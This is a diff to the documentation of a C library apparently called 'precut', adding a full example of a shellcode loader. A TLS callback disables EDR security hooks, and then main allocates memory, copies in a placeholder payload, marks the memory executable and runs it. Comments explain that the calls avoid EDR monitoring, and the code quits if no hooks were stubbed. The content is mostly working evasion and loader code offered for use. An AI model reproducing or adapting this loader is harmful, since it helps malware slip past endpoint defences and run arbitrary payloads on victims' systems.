@@ -106,6 +106,8 @@ int main(void)
 
 ### Loader with its own TLS callback
 
+Typical integration: precut neutralizes hooks in the TLS callback, then `main` allocates, writes, and executes a payload through APIs that would normally be hooked.
+
 ```c
 #define PRECUT_IMPLEMENTATION
 
@@ -115,16 +117,10 @@ int main(void)
 
 #include "precut.h"
 
-static void on_stub(const wchar_t *name, void *base, int ok)
-{
-    (void)name; (void)base; (void)ok;
-}
-
 static void NTAPI my_tls_callback(PVOID h, DWORD reason, PVOID r)
 {
     (void)h; (void)r;
     if (reason != DLL_PROCESS_ATTACH) return;
-    precut_set_callback(on_stub);
     precut_arm();
 }
 
@@ -134,18 +130,36 @@ __declspec(allocate(".CRT$XLB"))
     PIMAGE_TLS_CALLBACK g_my_tls = my_tls_callback;
 __declspec(thread) static volatile int g_tls_keep = 0;
 
+/* Replace with your actual payload */
+static unsigned char payload[] = { /* ... */ };
+
 int main(void)
 {
+    LPVOID mem;
+    DWORD old;
+
     (void)g_tls_keep;
 
-    if (precut_stub_count() > 0) {
-        /* EDR hooks neutralized */
-    }
+    if (precut_stub_count() == 0)
+        return 1;  /* nothing was stubbed — EDR may be watching */
 
     precut_disarm();
+
+    /* These calls now hit clean syscall stubs — no EDR inline hooks */
+    mem = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE,
+                       PAGE_READWRITE);
+    if (!mem) return 1;
+
+    CopyMemory(mem, payload, sizeof(payload));
+    VirtualProtect(mem, sizeof(payload), PAGE_EXECUTE_READ, &old);
+
+    ((void (*)(void))mem)();
+
     return 0;
 }
 ```
+
+The flow: TLS callback fires → `precut_arm()` stubs EDR entry points → `main` checks the stub count → `VirtualAlloc` / `VirtualProtect` / execute go through unhooked `ntdll` stubs.
 
 ### Target macros
 
